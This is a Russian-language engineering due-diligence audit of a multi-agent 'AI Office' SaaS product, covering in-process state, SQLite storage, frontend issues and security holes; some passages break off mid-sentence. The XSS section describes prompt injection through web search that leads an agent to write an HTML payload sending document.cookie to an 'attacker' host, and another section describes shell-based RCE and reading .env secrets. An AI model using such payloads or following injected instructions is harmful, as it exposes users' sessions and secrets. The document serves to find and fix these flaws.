# Technical Due Diligence — AI Office

Дата: 17.07.2026
Формат: полный инженерный аудит проекта на предмет готовности к росту (100 →
1,000,000+ пользователей) и к привлечению инвестиций. Основан на прямом чтении
кода (не на документации/обещаниях): `server.py`, `src/office/*`, `src/core/*`,
`src/saas/*`, `webapp/src/*`, конфигурации, зависимостей и реального лога
прогона офиса.

Правила этого документа: никакая оценка не даётся без обоснования из кода;
каждая находка — с приоритетом, сложностью и конкретным путём исправления.

---

## 0. Итоговый вердикт

**Доменная архитектура — на уровне senior+ команды. Инфраструктурная
архитектура — не выдержит роста дальше нескольких сотен активных тенантов.**

Сильная сторона: BOS-архитектура (World Model, Intent, Acceptance, Decision
Engine, Event Layer, Skills/Tool Router) — реально работающая развязка, не
декорация. Комментарии в коде объясняют *почему*, а не *что* — редкость,
обычно означает, что решения выстраданы реальными инцидентами, а не
придуманы заранее.

Слабая сторона — фундаментальная, не «список TODO»: **всё состояние офисов
живёт в module-level dict'ах одного Python-процесса** (задачи, блокирующие
вопросы пользователю как `asyncio.Future`, SSE-подписки, rate-limit-буферы,
watchdog-таймеры). Это делает **горизонтальное масштабирование архитектурно
невозможным без переписывания**, а не вопросом добавления серверов.

Итоговая оценка: **≈50/100** — выдающийся домен на нежизнеспособной для
серьёзного роста инфраструктурной базе. Проект инвестируем **с условием**:
доменные слои чистые, поэтому замену инфраструктуры под ними реально
провести без переписывания бизнес-логики.

### Сравнение с Linear / Cursor / Notion / Raycast / Vercel / Arc

Проигрывает не идеей и не визуалом — Mercury-палитра, motion, дизайн-система
сделаны на приличном уровне. Проигрывает **инженерной инфраструктурой**:
у перечисленных продуктов stateless-сервисы, горизонтальный автоскейл,
durable-хранилище состояния, виртуализация списков, eval-пайплайны для
качества — это данность их инженерной культуры. Здесь всё перечисленное
либо в RAM одного процесса, либо явно отложено в комментариях как
«Phase 6». Качество *взаимодействия* тоже отстаёт: Linear ощущается
мгновенным за счёт локального стора и optimistic UI; здесь — SSE +
2-секундный polling поверх файлового хранилища.

## 2. ЧАСТЬ 0 — Фатальный класс проблем: single-process by design

Это не одна проблема, а корень примерно половины остальных находок аудита.
Разбирается отдельно, потому что здесь сосредоточена основная инвестиционная
угроза.

### 2.1 [CRITICAL] Всё состояние офисов — в module-level dict'ах процесса

**Факт из кода.** Следующие модули держат `dict[tenant_id -> ...]` прямо в
памяти Python-процесса, а не во внешнем сторе:

```
src/office/loop.py:        _office_tasks, _first_cycle_done,
                            _completion_announced, _last_blocked_heartbeat,
                            _net_fail_streak
src/office/execution.py:   _thinking_since, _agent_task, _agent_coro,
                            _model_fail_count, _current_ms
src/office/questions.py:   _pending (asyncio.Future блокирующих вопросов!),
                            _meta, _by_text, _asked_log
src/office/bus.py:         _subs (очереди SSE-подписчиков)
src/office/agent_inbox.py: _inboxes
src/office/planning_engine.py: _last_leader_sig, _last_delegate_sig
src/office/bot_runtime.py: _offsets
server.py:                 _rate_buckets
```

`questions._pending` хранит **`asyncio.Future`** — то есть незавершённое
"обещание" ответа пользователя буквально живёт как объект в памяти процесса.
`loop._office_tasks` хранит **живые `asyncio.Task`** офис-циклов каждого
тенанта.

`src/saas/context.py` сам честно документирует это ограничение в
комментарии: *«Однопроцессный uvicorn (не multi-worker) — безопасно: нет
другого процесса, который менял бы файлы мимо write_json/delete_file»*.

**Почему это стена, а не технический долг:**

1. **Нельзя запустить второй uvicorn-воркер или под.** Каждый воркер завёл
   бы свой собственный `_office_tasks` — оба начали бы гонять офис-цикл
   ОДНОГО тенанта параллельно, оба списывали бы деньги за LLM-вызовы, оба
   писали бы в один `plan.json` (последняя запись побеждает — гонка).
   Горизонтальное масштабирование запрещено дизайном, а не «пока не
   реализовано».
2. **Рестарт/деплой/OOM теряет всё in-flight состояние.** Пользователь, на
   вопрос которого офис ждёт ответа (`questions._pending`), после рестарта
   сервера — теряет этот вопрос безвозвратно (future исчезает вместе с
   процессом), офис никогда не узнает, что переспросить.
3. **Rate-limit и cost-лимиты обнуляются рестартом и обходятся
   multi-pod'ом** — каждый под считает свой собственный `_rate_buckets`.

**Последствие для бизнеса.** На 100 активных тенантах вы уже физически не
можете добавить второй сервер под нагрузку — единственный доступный рычаг
масштабирования — вертикальный (больше CPU/RAM одной машине), который
упирается в потолок очень быстро при агентных LLM-вызовах (I/O-bound,
но с реальной CPU-нагрузкой на JSON-сериализацию/критик/сборку сайтов).

**Правильное решение (уровня зрелой инженерной команды).**

- Офис-цикл конкретного тенанта должен исполняться **stateless-воркером**,
  который берёт тенанта из **durable-очереди** (Postgres `SELECT ... FOR
  UPDATE SKIP LOCKED`, либо Redis Streams, либо Temporal/Celery), держит
  **распределённый лок** на тенанта (`SET NX PX` в Redis) на время одного
  тика, отпускает после. Любой из N воркеров может взять любого тенанта —
  это и даёт горизонтальный скейл.
- **Блокирующие вопросы** — не `asyncio.Future` в RAM, а строка в БД со
  статусом `awaiting_answer` (плюс `question_id`, `agent_id`, `text`,
  `created_ts`). Ответ пользователя через HTTP переводит статус в
  `answered` и публикует событие "разбудить воркера тенанта" (Redis
  pub/sub). Обязано переживать рестарт процесса.
- **SSE-фанаут** — через Redis pub/sub: воркер публикует событие в канал
  `tenant:<id>`, любой под с открытым SSE-соединением этого тенанта
  подписан на канал и ретранслирует в браузер — независимо от того, какой
  под физически обслуживает HTTP-соединение.
- **Rate-limit / cost-буферы** — в Redis (`INCR` с TTL), не в
  process-memory dict.

Сложность: **XL**. Оценка времени: 3–5 недель для команды из 2 инженеров
(с учётом миграции существующих данных и тестирования гонок). Без этого шага
разговор про «миллионы пользователей» инженерно несостоятелен.

### 2.2 [CRITICAL] SQLite + JSON-файлы как основное хранилище

**Факт из кода.** `src/saas/db.py` — SQLite с **одним глобальным
`threading.Lock()`** на все операции записи:

```python
_lock = threading.Lock()
...
def execute(sql, params=()):
    with _lock:
        cur = conn().execute(sql, params)
        conn().commit()
        return cur
```

Данные самого офиса (`plan.json`, `projects.json`, `milestones.json`,
`costs.json` и т.д.) — JSON-файлы на диске, по одному набору файлов на
тенанта в `data/tenants/<tid>/`. Атомарность записи одного файла сделана
аккуратно (`tmp + os.replace`, с ретраями под Windows `PermissionError`) —
это единственная часть хранилища, которую можно похвалить без оговорок.

**Проблемы:**

1. `db.execute` **сериализует абсолютно все записи через один mutex** — на
   10 000 активных пользователей это единственный writer-поток на всю
   систему аутентификации/тенантов.
2. JSON-per-tenant **не переживает многопроцессность** (см. §2.1), **не
   даёт межсущностных транзакций** — приём инициативы одновременно меняет
   `plan.json`, `projects.json`, `specification.json` тремя отдельными
   записями; падение процесса между записями оставляет несогласованное
   состояние без отката.
3. **Не индексируется и не масштабируется по объёму** — `data/tenants/`
   на 100 000 пользователей означает сотни тысяч директорий на одной
   файловой системе одной машины. Поиск/агрегация по всем тенантам
   (биллинг, аналитика продукта) требует обхода файловой системы, а не
   SQL-запроса.
4. Файл `requirements.txt` сам документирует: *«Postgres появится в проде
   (Phase 6); для dev и старта достаточно SQLite»* — это осознанный долг,
   но он структурно завязан на переписывание из §2.1 (нельзя мигрировать
   хранилище, не решив вопрос многопроцессности одновременно, иначе
   получите Postgres с той же однопроцессной моделью доступа).

**Последствие.** Первое реальное бутылочное горлышко под нагрузкой — не
LLM (это внешний сервис с собственным масштабом), а **диск и глобальный
SQLite-lock** этого процесса.

**Решение.**

- **Postgres как единый источник правды.** Первый шаг миграции —
  минимально инвазивный: одна таблица `tenant_state(tenant_id, doc_type,
  data jsonb, updated_at)`, куда переезжают все текущие JSON-файлы почти
  1-в-1 (по сути замена файловой системы на jsonb-документы с тем же
  форматом) — это позволяет включить многопроцессность и убрать
  файловый SPOF, не переписывая доменную логику `office/*.py` (она уже
  работает через `context.read_json/write_json` — единую точку доступа,
  которую нужно поменять один раз).
- Второй шаг (не блокирующий первый) — нормализация горячих сущностей
  (`plan_tasks`, `costs_entries`) в настоящие таблицы, когда понадобятся
  SQL-агрегации/индексы.
- **Файлы workspace/сайтов** (код, который пишут агенты, опубликованные
  сайты) — в объектное хранилище (S3/Cloudflare R2), не на локальный диск
  пода: под эфемерен при горизонтальном масштабировании, локальный диск
  пропадает вместе с подом.

Сложность: **XL**. Зависит от §2.1 (миграция хранилища без решения
многопроцессности бессмысленна).

### 2.3 [HIGH] Один event loop — один зависший LLM-вызов вредит всем тенантам

`CALL_TIMEOUT` в `core/llm.py` есть и это правильно, но `loop.run()`
итерирует всех тенантов **последовательно в одном asyncio event loop**
одного процесса. `AGENT_MAX_THINK_SECS`-watchdog (`_heal_stuck_agents`)
частично компенсирует зависшие агенты, но не решает фундаментальную
пропускную способность: **на 1000 активных офисов с интервалом цикла 10
секунд физически не успеваете обойти круг** — нагрузка растёт линейно с
числом тенантов на единственный поток управления.

Решение — то же, что в §2.1: множественные stateless-воркеры, каждый
берёт подмножество тенантов из очереди.

## 3. ЧАСТЬ 1 — Архитектура (домен — сильно, инфраструктура — слабо)

### 3.1 Что сделано хорошо (с аргументами)

- **Слоистость реально соблюдена**, не только продекларирована в
  CLAUDE.md §4: домен — исключительно `src/office/*.py`, HTTP-слой —
  тонкий в `server.py` (роут читает контекст, вызывает домен, не решает
  сам), персистентность — только через `context.read_json/write_json`
  (единая точка, а не разбросанные `open()`/`json.dump`). Такую
  дисциплину редко удерживают дольше пары месяцев без линтера,
  подтверждающего границы — здесь она держится через явную конвенцию в
  CLAUDE.md и, судя по коду, реально соблюдается.
- **Acceptance Layer (`acceptance.py`) / Decision Engine
  (`decision_engine.py`) / Event Layer (`events.py`)** — не декоративные
  прослойки, а работающие развязки с реальным вето. `decision_engine.py`
  прогоняет предлагаемый diff плана через детерминированные проверки
  (бюджет через `costs.would_exceed`, мьютекс артефакта «сайт» через
  `plan.site_task_in_progress`, вето Конституции на запрещённые
  конструкторы) **до** применения к реальному плану — это архитектура
  уровня "Sandbox → propose → check → apply", которую обычно видно только
  в зрелых финтех/инфраструктурных системах.
- **Tool Router (`tool_router.py`) / Skills-слой (`skills.py`)** —
  правильный масштабируемый приём развязки «агент выражает потребность
  словами → роутер подбирает конкретную реализацию»: новая интеграция или
  новый скилл подключается без правки промптов существующих ролей.

### 3.2 Проблемы

**3.2.1 [HIGH] `server.py` — 2710 строк, 164 HTTP-роута в одном файле.**
Это God-file по определению, даже при том, что каждый отдельный роут
тонкий и корректный. Последствия: невозможно параллельно ревьюить
изменения в разных доменах без конфликтов мержа в одном файле; поиск
нужного роута требует grep вместо навигации по структуре директорий;
когнитивная нагрузка на новичка в команде — открыть файл на 2710 строк.

*Решение:* вынести в `server/routers/{auth,office,integrations,results,
settings,billing}.py` через `fastapi.APIRouter`, подключаемые в `server.py`
через `app.include_router(...)`. Механическая декомпозиция, не меняющая
поведение ни одного эндпоинта. Сложность: **M**. Риск: низкий (чисто
структурный рефакторинг, накрывается smoke-тестом по всем путям).

**3.2.2 [HIGH] Циклические зависимости замаскированы lazy-import'ами
внутри функций.** Пример плотности связности — `execution.py` делает 18
отдельных `from src.office import X` внутри тела функций (не на уровне
модуля), `loop.py` — 13, `prompt_builder.py` — 10, `decision_engine.py` и
`acceptance.py` — по 7. Технически это работает (Python это позволяет), но
это **симптом**, а не паттерн: если бы модули не зависели друг от друга
циклически, импорты стояли бы на уровне модуля. Lazy-import — это способ
**обойти** цикл импортов, не разорвать его.

Последствие для роста команды: граф зависимостей `office/*` невозможно
статически проверить инструментом (import-linter, pydeps) — цикл появится
незаметно при добавлении нового модуля, который где-то внутри функции
импортирует то, что импортирует его.

*Решение:* выделить два слоя внутри `office/`:
- `office/core/` — чистые сущности без зависимостей друг от друга по
  бизнес-логике (world, plan, projects, milestones, org, roles) —
  разрешён импорт только "вниз", к ещё более базовым модулям;
- `office/services/` — оркестрация поверх core (execution, planning_engine,
  decision_engine, acceptance) — разрешён импорт core, запрещён импорт
  других services напрямую (только через events/decision_engine).

Ввести `import-linter`-конфигурацию, проверяющую это правило в CI.
Сложность: **L** (требует реальной реорганизации файлов, не только
перемещения). Делать после §3.2.1 (когда server.py не мешает видеть
доменные границы).

**3.2.3 [MEDIUM] Нет доменных транзакций между сущностями.** Пример,
который мы правили в этой сессии: `accept_initiative` в `server.py`
последовательно вызывает `plan_module.add_task` (несколько раз),
`spec_module.ensure`, публикует события — всё это отдельные записи в
отдельные JSON-файлы без единой транзакции. Падение процесса между
шагами оставляет задачи в `plan.json` без соответствующей записи в
`specification.json`. `context.locked()` существует как примитив, но
применяется точечно, не системно.

*Решение:* после миграции на Postgres (§2.2) — оборачивать
мультисущностные мутации в `BEGIN/COMMIT`. До миграции — не тратить
время на полумеры (блокировки поверх JSON-файлов не дают настоящей
атомарности).

## 4. ЧАСТЬ 2 — Frontend

Скриншотный визуальный аудит "по кнопке" в этом документе не проводится:
рендер-скриншоты в headless-окружении нестабильны для содержательного
вывода, а оценка "на глаз по JSX-коду" была бы недостоверной. Ниже —
находки, подтверждённые статическим анализом кода и структуры.

### 4.1 [HIGH] `ProjectView.tsx` — 1291 строка в одном компоненте

Топ-5 крупнейших файлов фронтенда: `ProjectView.tsx` (1291),

### 4.2 [HIGH] Нет виртуализации длинных списков

Ни в одном файле фронтенда не найдено использование
`react-window`/`@tanstack/react-virtual` или аналога (`grep` по

лентой событий это прямой источник лагов при скролле и первой отрисовке —

*Решение:* `@tanstack/react-virtual` на: доску задач (`ProjectView`),

агентов при росте штата. Сложность: **M**, по одному списку за раз (это и

### 4.3 [CRITICAL / SECURITY] XSS через нерасанированный markdown от LLM

`webapp/src/app/views/FileExplorer.tsx:243`:

```tsx
function MarkdownView({ content }: { content: string }) {
  const html = useMemo(() => marked.parse(content || "") as string, [content])
  return (
    <div className="md-preview" ...
      dangerouslySetInnerHTML={{ __html: html }} />
  )
}
```

`content` — это содержимое `.md`-файлов (`offer.md`, `strategy.md`,
`tech_design.md`, `brand_book.md`), которые **пишет LLM-агент** через
`write_file`. `marked.parse()` конвертирует markdown в HTML **без
последующей санитизации** — в проекте не найдено ни одной зависимости или
вызова `DOMPurify`/`sanitize` (`grep -rn "DOMPurify\|sanitize"` по всему
`webapp/src` — пусто).

**Вектор атаки:** промпт-инъекция через веб-поиск (агент `researcher`/
`orchestrator` использует `web_search` — контент результатов поиска
попадает в контекст LLM) или через прямой ввод в бриф/чат клиента → агент,
следуя инструкции из отравленного контента, пишет в `.md`-файл
HTML-payload (`<img src=x onerror=fetch('https://attacker/'+document.cookie)>`
или аналог) → владелец открывает вкладку «Папки» → payload исполняется в
контексте авторизованной сессии владельца офиса.

**Приоритет: CRITICAL по классу уязвимости, HIGH по вероятности
эксплуатации** (требует, чтобы агент буквально записал HTML-теги в md-файл
под влиянием инъекции — не тривиально, но реалистично для системы,
которая по дизайну даёт LLM автономную запись файлов).

*Решение:*
```tsx
import DOMPurify from "dompurify"
const html = useMemo(
  () => DOMPurify.sanitize(marked.parse(content || "") as string),
  [content]
)
```
Добавить `dompurify` + `@types/dompurify` в `webapp/package.json`.
Сложность: **XS**. Время: 15–30 минут. **Чинить в первую очередь**, до
любого другого пункта этого документа — самый дешёвый и самый весомый по
риску фикс во всём аудите.

### 4.3 [MEDIUM] Инлайн-стили расползаются, несмотря на дизайн-систему

CLAUDE.md §5 сам документирует прошлый инцидент (2026-07-13): 4 файла
независимо объявляли свой `inputStyle`, разъехавшийся по деталям
(radius-sm vs radius-md). `FileExplorer.tsx` и другие файлы продолжают
использовать `style={{...}}` инлайн для интерактивных элементов вместо
`Button`/`TextInput` из `app/views/ui.tsx`. Дизайн-токены (CSS-переменные)
есть, но их применение не проверяется автоматически (ни линтер, ни
CI-правило).

*Решение:* ESLint-правило, запрещающее `style={{` с `background`/`border`/
`borderRadius` вне списка разрешённых файлов (бренд-заблокированные
исключения вроде кнопки «Войти через Google»). Сложность: **S** для
правила, **M** для миграции существующих нарушений.

### 4.4 [MEDIUM] Нет reconnect-стратегии для SSE и нет Error Boundary

`OfficeProvider.tsx` держит единственный источник состояния через SSE
(`/events`). Учитывая §2.1 (рестарты процесса рвут SSE-соединения при
любом деплое), на фронте необходим reconnect-with-backoff — в текущем
коде явного паттерна повторного подключения при обрыве не обнаружено.
Также не найден React Error Boundary верхнего уровня — необработанное
исключение в любом дочернем компоненте (например, в рендере
некорректных данных с бэкенда) уронит всё приложение в белый экран без
диагностики для пользователя.

*Решение:* EventSource reconnect с экспоненциальным backoff + toast
"переподключение..."; `ErrorBoundary` вокруг `<App />` с fallback-UI и
логированием в Sentry/аналог. Сложность: **S**.

### 4.5 Сравнение качества взаимодействия с эталонами (Linear/Cursor/Raycast/Vercel/Arc)

Отставание не в визуальном языке (Mercury-градиент, motion-анимации,
консистентная тёмная тема сделаны на приемлемом уровне) — отставание в
**качестве отклика под данными**: у эталонов — локальный стор + optimistic
UI (действие мгновенно отражается в интерфейсе, синхронизация с сервером
происходит в фоне и откатывается только при ошибке); здесь —
запрос-ожидание-ответ через SSE и `useThrottled`-polling с интервалом 2
секунды. Это архитектурное решение, не косметика — исправляется только
вместе с §2.1 (когда состояние станет по-настоящему real-time
синхронизируемым через устойчивый канал, можно добавлять optimistic UI
поверх).

### 5.2 [CRITICAL / SECURITY] `/api/terminal` и `/api/run` — RCE by design

`server.py:1494-1520`, комментарий в самом коде:

> ⚠️ shell=True не ограничивает саму команду (path traversal через `cat
> ../../<tenant>/...`, чтение `.env` и т.п.) — docs/audit-dd-2026-07.md
> §17. Выключено по умолчанию оператором до появления реальной песочницы
> исполнения.

Защита сегодня — единственный флаг `ALLOW_CODE_EXECUTION=0` по умолчанию.
Но продукт по своей природе требует, чтобы агенты писали и **запускали**
код (тестирование ботов, сборка сайтов через `npm run build` — уже
происходит через `site_builder.py`, минуя явный флаг терминала, что само
по себе отдельная граница исполнения кода, которую стоит аудировать
отдельно). Как только `ALLOW_CODE_EXECUTION=1` включат для реальных
клиентов (а его придётся включить для заявленной автономности продукта),
**любой тенант получает шелл на хосте с правами процесса сервера** —
включая чтение `.env` с `APP_SECRET` (Fernet-ключ, шифрующий секреты
**всех** тенантов, см. §5.3) и произвольную запись за пределы своего
workspace через `../../<другой-tenant>/`.

`SANDBOX_MODE=direct` — дефолт без изоляции. Docker-режим
(`docker/sandbox.Dockerfile`, `src/office/exec_sandbox.py`) существует в
коде, но: требует заранее собранного образа, и юнит-тест
`test_exec_sandbox.py` в текущем окружении **падает** (`assert
f"{str(d)}:/workspace:rw" in args` — несовпадение формата пути на
Windows), то есть даже базовая конструкция docker-команды не
верифицирована как рабочая в CI на этой машине.

*Решение (по приоритету):*
1. Немедленно: явный ассерт/проверка при старте сервера — если
   `ALLOW_CODE_EXECUTION=1` **и** `SANDBOX_MODE=direct` **и**
   `APP_BASE_URL` похож на прод (https, не localhost) — отказ запуска с
   громким сообщением. Это не решает проблему, но не даёт включить её
   молча в проде. Сложность: **XS**.
2. Исправить `test_exec_sandbox.py` под кросс-платформенные пути, довести
   Docker-режим до реально проверенного состояния (сборка образа в CI,
   зелёный тест). Сложность: **M**.
3. Стратегически: настоящая изоляция для мультиарендного исполнения кода
   — gVisor или Firecracker microVM вместо обычного Docker (Docker sandbox
   без сетевой изоляции + non-root + read-only FS — минимальная планка,
   но для по-настоящему враждебной мультиарендности этого may not
   достаточно против side-channel и kernel-эксплойтов). Сложность: **XL**.

### 5.3 [CRITICAL, следствие §5.2] Единый `APP_SECRET` — единая точка компрометации всех тенантов

`src/saas/crypto.py` использует один `APP_SECRET` (Fernet-ключ) для
шифрования секретов **всех** тенантов at-rest (LLM-ключи, учётные данные
интеграций). Это само по себе стандартная практика (per-tenant ключи —
overkill для этого масштаба), **но** в сочетании с §5.2 — если RCE через
терминал даёт доступ к `.env`, скомпрометированы секреты не одного
тенанта, а **всех**. Нет документированной процедуры ротации ключа.

*Решение:* после закрытия §5.2 риск снижается сам собой. Отдельно — план
ротации `APP_SECRET` (Fernet поддерживает `MultiFernet` для миграции без
даунтайма) должен существовать как runbook, не как импровизация в
момент инцидента. Сложность: **S** (написать runbook + добавить
`MultiFernet`-поддержку).

### 5.4 [HIGH] `ALLOW_DEV_LOGIN=1` по умолчанию

`src/saas/auth.py`: `ALLOW_DEV_LOGIN = os.getenv("ALLOW_DEV_LOGIN", "1") ==
"1"` — вход по любому email без пароля включён **по умолчанию**.
`server.py` эндпоинт `/auth/dev-login` защищён только rate-limit'ом,
никакой другой проверкой окружения. Если переменная случайно не будет
выставлена в `0` при деплое в прод (человеческий фактор — самый частый
источник инцидентов такого рода), любой посетитель сайта получает
аккаунт с рабочим пространством одним POST-запросом.

*Решение:* поменять дефолт на `"0"`; дополнительно — явная проверка при
старте: если `APP_BASE_URL` начинается с `https` (эвристика "это не
localhost-разработка") и `ALLOW_DEV_LOGIN=1` — громкое предупреждение в
лог при каждом старте процесса, в идеале — hard-fail. Сложность: **XS**.

### 5.5 [HIGH] Rate-limit — in-memory, не переживает multi-pod и рестарт

`server.py`: `_rate_buckets: dict[str, dict[str, list[float]]] = {}` —
process-memory, тот же корневой класс проблемы, что §2.1. На нескольких
подах каждый считает свой собственный лимит независимо (лимит X
запросов/мин на под × N подов = реальный лимит X×N) — для anti-abuse
публичной формы лидов (`/api/lead/{tenant}/{slug}`, без авторизации) это
прямая дыра для спама/парсинга/накрутки лидов конкурентами. После
рестарта лимит обнуляется мгновенно.

*Решение:* тот же Redis `INCR`+`EXPIRE`, что в §2.1. Сложность:
**S** (после того как Redis появится в инфраструктуре — тривиальная
замена реализации `_rate_limited` при сохранении сигнатуры).

### 5.6 [HIGH] Нет идемпотентности на мутирующих эндпоинтах

`accept_initiative`, `/api/ask`, вебхуки Telegram/GitHub-OAuth-callback —
двойной клик в UI или сетевой ретрай создают дублирующиеся эффекты.
Частично прикрыто точечным дедупом (`plan.add_task` не создаёт вторую
задачу с идентичным title+role в статусе pending/in_progress), но это не
системный механизм — например, `accept_initiative`, вызванный дважды с
одним `iid`, если `initiatives_module.accept(iid)` не идемпотентен сам по
себе, создаст задачи дважды под разными temp-id.

*Решение:* стандартный паттерн `Idempotency-Key` заголовка на мутирующих
эндпоинтах, ключ + результат первого выполнения кешируются на N минут
(в Redis после §2.1, до того — таблица SQLite с TTL-очисткой). Сложность:
**M**, применять точечно к самым рискованным эндпоинтам сначала (приём
инициатив, вебхуки).

### 5.7 [MEDIUM] Единый `db._lock` в `saas/db.py` сериализует все SQL-записи

См. §2.2 — тот же корень, отдельно упомянут здесь как backend-специфичная
проблема производительности, а не только масштабирования.

### 5.8 [MEDIUM] `except Exception: pass` в менеджере тенантов глотает все ошибки молча

`src/office/loop.py`, функция `run()`:

```python
async def run() -> None:
    while True:
        try:
            ...
            for tid in tids:
                ...
                _office_tasks[tid] = asyncio.create_task(_run_office(tid))
        except Exception:
            pass
        await asyncio.sleep(MANAGER_POLL)
```

Если у одного тенанта стабильно падает `_run_office` при старте

*Решение:* минимум — `logging.exception()` внутри `except`, чтобы ошибка

одного тенанта N циклов подряд. Сложность: **XS** для лога, **S** для
метрики.

## 6. ЧАСТЬ 4 — AI / агентная система

Самая зрелая часть проекта, но с системным (не точечным) классом проблем.

### 6.1 Что сделано хорошо

- 3-слойная память (GLOBAL/DEPARTMENT/RETRIEVAL) с гибридным скором

### 6.2 [HIGH] Промпт-инструкции без программных гарантий — системный паттерн, не два изолированных бага

В текущей сессии закрыты два конкретных случая, найденных живым аудитом
логов реального прогона:
- `designer` выбирал визуальное направление сайта самостоятельно, ни разу
  не спросив владельца через `ask_user`, хотя `builtin_skills/
  brand_book.md` текстом это требует;
- `integrator` закрывал задачу текстом «нужно получить ID счётчика у
  клиента», реально вопрос не задав.

Оба случая закрыты программными гейтами в `acceptance.py` (задача не
проходит приёмку без зафиксированного вызова `ask_user`). Но это —
**симптом общего паттерна**: десятки поведенческих инвариантов в
проекте живут исключительно текстом внутри `.md`-файлов ролей
(`office/builtin_roles/*.md`) и скиллов (`office/builtin_skills/*.md`), и
LLM-исполнитель юридически (по контракту function-calling) свободен их
игнорировать под давлением контекста/токенов — что реальный прогон и
продемонстрировал многократно: `designer` 4+ раза за один прогон пытался
записать в `site/` вопреки явному текстовому запрету в своей роли (деньги
потрачены на заведомо провальные вызовы), критик несколько раз гонял
одну и ту же задачу по кругу «правь → проверь → снова та же проблема
другими словами».

*Решение:* провести систематический аудит **всех** инвариантов,
перечисленных в CLAUDE.md §4 и в builtin_roles/builtin_skills, и для
каждого явно определить — enforced ли он кодом (тест или рантайм-гейт в
`acceptance.py`/`decision_engine.py`) или существует только текстом в
промпте. Результат — таблица `инвариант → механизм enforcement`.
Инварианты без кодового enforcement — приоритизировать по частоте
нарушения в реальных логах прогонов и закрывать по одному, тем же
паттерном, что применён в этой сессии (see: PR-план §14, PR-4).
Сложность: **M** для аудита-таблицы, **S каждый** для отдельных гейтов.

### 6.3 [HIGH] Неконтролируемый рост контекста на длинных задачах — стоимость не под контролем

Реальный прогон (лог 2026-07-17): агент `developer_p1_45130` сделал **81
вызов LLM** на одну задачу, входные токены — **827,931** для одного
агента за прогон. `system_chars`/`task_chars` в трейсе растут от
итерации к итерации (видно по `prompt` записям в логе) — история задачи
внутри `run_agent` накапливается без сжатия, только retrieval подмешивает
релевантные факты **сверху**, не заменяя раздувшуюся историю самой
задачи.

**Последствие:** на длинных агентных сессиях (что типично именно для
этого продукта — сайт с 5-8 циклами критик→правка) стоимость одного
токена растёт квадратично с числом итераций (каждая новая итерация видит
всю накопленную историю). При масштабировании на тысячи одновременных
office-циклов это прямой и неконтролируемый рост LLM-счёта, который
плохо предсказуем на этапе `execution_policy.estimate_cost` (оценка
делается **до** начала работы, по типовым токенам роли — не учитывает
реальную длину итеративного цикла критика).

*Решение:*
- Суммаризация истории задачи после N итераций (например, каждые 4-5
  итераций — сжатие предыдущего диалога в краткое резюме "что уже
  пробовали, что не сработало", вместо хранения полного tool-call
  трейса).
- Бюджетный контроль **внутри** задачи, не только на входе: если задача
  превысила N итераций без прогресса (критик находит новые проблемы
  вместо подтверждения исправления старых), эскалация как `blocker`
  раньше, чем сейчас (`MAX_TASK_ATTEMPTS=3` — на уровне *приёмки*, не на
  уровне итераций *внутри* одной попытки, где реально происходит рост
  токенов).

Сложность: **M**. Требует изменений в `core/llm.py` (сжатие истории) и
`execution.py` (контроль итераций критика).

### 6.4 [MEDIUM] Найм неиспользуемых агентов — прямая трата денег

Лог реального прогона: `cto_1` и `cmo_1` наняты и остаются `idle` весь
прогон без единой назначенной задачи. Найм агента = `agent_start` с
оценкой стоимости — даже если сам агент не сделал ни одного LLM-вызова,
организационный overhead (открытие отдела, назначение лидера) не
бесплатен, а главное — вводит владельца в заблуждение относительно
реального состава занятой команды.

*Решение:* CEO не должен открывать отдел "про запас" без хотя бы одной
готовой к назначению задачи в плане на этот отдел (`plan.
departments_needed()` уже даёт эту информацию — вопрос в том, что
`decide()` в оркестраторе, судя по логу, открывает отделы с опережением).
Сложность: **S** — точечная правка условия открытия отдела в
`orchestrator.decide`.

### 6.5 [MEDIUM] Нет офлайн-оценки качества агентных решений (eval)

В проекте нет golden-набора сценариев с ожидаемым поведением и LLM-judge
или программной проверкой результата для регрессионного тестирования
промптов/ролей/скиллов. `tests/run_all.py` покрывает детерминированную
логику (planning_engine, acceptance, company_scan и т.д.) без реальных
LLM-вызовов — это правильно для CI ($0, быстро), но означает, что
**изменение промпта роли или скилла не имеет автоматической проверки на
регресс качества** — только ручной живой прогон, как делался в этой
сессии.

*Решение:* golden-set из 10-20 реалистичных сценариев (по одному на
основные роли/ниши), прогоняемых периодически (не в каждом CI-коммите —
дорого) с реальным LLM + LLM-judge, оценивающим соответствие ожидаемому
поведению (вызвал ли ask_user, когда должен был; не начал ли писать с
нуля вместо точечной правки и т.д.). Результат — трекается как метрика во
времени, алерт при деградации. Сложность: **L**, отдельный проект, не
один PR.

## 8. ЧАСТЬ 6 — Performance

- **Bundle:** code-splitting по вкладкам реализован (`vite build` даёт
  отдельные чанки на вьюху — `App-*.js` 45KB, `ChatsView-*.js` 12KB и
  т.д.) — это сделано правильно, не тривиальная заслуга при таком числе
  вьюх. Библиотечный вес (`motion` ~12, `marked`) в пределах разумного
  для функциональности, которую они дают.
- **Отсутствие виртуализации списков** (§4.2) — главный клиентский
  источник деградации под реальным объёмом данных.
- **Backend bottleneck — не рендер, а §2.1–2.3**: единый event loop и
  SQLite-lock, не сам код обработки запроса.
- **N+1 по файловой системе:** `world.snapshot()` и `storage_usage.
  summary()` обходят весь workspace тенанта на каждый вызов
  (`os.walk`-подобная логика). На тенанте с большим количеством файлов в
  `workspace/` это дисковый обход **в горячем пути** `/api/world`
  (вызывается на каждый цикл офиса + при каждом открытии дашборда) и
  `/api/storage/usage`. Нет кеширования снапшота между вызовами в рамках
  одного цикла (хотя `world.py` упоминает `invalidate_cache`/`snapshot
  is cached within same cycle` — судя по тестам, кеш **есть**, но
  область его действия — только в рамках одного офис-цикла, а не
  запросов от UI, которые могут прилетать чаще).

*Решение (для N+1):* кешировать `storage_usage.summary()` с TTL в
несколько секунд (это не real-time критичная метрика); убедиться, что
`world.snapshot()`-кеш инвалидируется корректно и переиспользуется между
HTTP-запросами дашборда, а не только внутри офис-цикла. Сложность: **S**.

## 9. ЧАСТЬ 7 — Product

### 9.1 Ценностное предложение — сильное и дифференцирующее

«Поставьте цель — офис из AI-агентов сам исследует рынок, спроектирует
решение, разобьёт на задачи, наймёт нужных специалистов и сделает
реальный результат (код, сайт, лиды)» — это не «ещё один чат-интерфейс
поверх GPT», а попытка автономного end-to-end продукта. Идея
конкурентоспособна и это признаётся без иронии.

### 9.2 Где теряется доверие — подтверждено реальным логом прогона

Реальный прогон (полностью проаудирован в этой сессии, часть находок уже
исправлена) продемонстрировал:
- Два конкурирующих сайта под одним брендом, опубликованных
  параллельно, оба пишущих в один физический `site/` — исправлено в этой
